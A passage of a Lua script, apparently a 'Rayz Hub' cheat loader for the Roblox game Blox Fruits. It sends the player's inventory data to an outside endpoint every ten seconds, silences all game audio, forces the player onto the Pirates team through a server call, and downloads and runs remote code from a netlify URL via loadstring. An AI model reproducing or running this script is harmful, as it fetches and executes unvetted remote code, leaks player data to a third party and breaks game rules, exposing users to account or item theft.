			Headers = { ["Content-Type"] = "application/json" },
			Body = body,
		})
	end)

	if ok and resp then
		local raw = (type(resp) == "table") and (resp.Body or resp.body) or tostring(resp)
		local pOk, decoded = pcall(function()
			return HttpService:JSONDecode(raw)
		end)
		if pOk and type(decoded) == "table" and decoded.id then
			lastMessageId = decoded.id
		end
	end
end

task.spawn(function()
	while true do
		pcall(sendInventoryEmbed)
		task.wait(10)
	end
end)

---------------------------------------------------------------------
--  AUDIO / TEAMS / LOAD
---------------------------------------------------------------------
local function hardMuteSound(obj)
	if obj:IsA("Sound") then
		pcall(function()
			obj.Volume = 0
			obj.Playing = false
			obj.PlaybackSpeed = 0
		end)
	end
end

local function muteAllAudio()
	pcall(function()
		SoundService.Volume = 0
	end)
	for _, s in ipairs(workspace:GetDescendants()) do
		hardMuteSound(s)
	end
	for _, s in ipairs(SoundService:GetDescendants()) do
		hardMuteSound(s)
	end
	local pg = lp:WaitForChild("PlayerGui", 5)
	if pg then
		for _, s in ipairs(pg:GetDescendants()) do
			hardMuteSound(s)
		end
		pg.DescendantAdded:Connect(hardMuteSound)
	end
	workspace.DescendantAdded:Connect(hardMuteSound)
	SoundService.DescendantAdded:Connect(hardMuteSound)
end

muteAllAudio()
lp.CharacterAdded:Connect(function()
	task.wait(0.5)
	muteAllAudio()
end)

pcall(function()
	for i = 1, 2 do
		CommF:InvokeServer("SetTeam", "Pirates")
		task.wait(0.2)
	end
end)

pcall(function()
	loadstring(game:HttpGet("https://rayzhub.netlify.app/scripts/bf-gui.lua"))()
end)

print("[Rayz Hub] blox-fruits loaded")